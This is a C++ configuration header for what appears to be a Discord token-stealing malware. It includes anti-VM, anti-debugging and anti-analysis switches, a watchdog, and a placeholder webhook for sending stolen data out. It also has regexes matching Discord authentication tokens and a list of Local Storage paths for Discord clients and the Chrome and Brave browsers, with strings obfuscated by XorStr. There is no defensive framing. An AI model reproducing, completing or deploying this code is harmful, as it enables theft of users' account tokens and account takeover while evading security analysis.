#pragma once
#include "includes.h"

namespace Config {
	
	bool check_virtual_machine = true;
	bool check_debugging = true;
	bool check_analyzing = true;
	bool watch_dog = true;
	
	const char* webhook = XorStr("webhook here");
	
	std::regex token_nonmfa(XorStr(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
	std::regex token_mfa(XorStr(R"(mfa\.[\w-]{84})"));

	char* installs[] = {
		XorStr("\\Lightcord\\Local Storage\\leveldb"),
		XorStr("\\Discord\\Local Storage\\leveldb"),
		XorStr("\\discordptb\\Local Storage\\leveldb"),
		XorStr("\\discordcanary\\Local Storage\\leveldb"),
		XorStr("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
		XorStr("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb")
	};
}
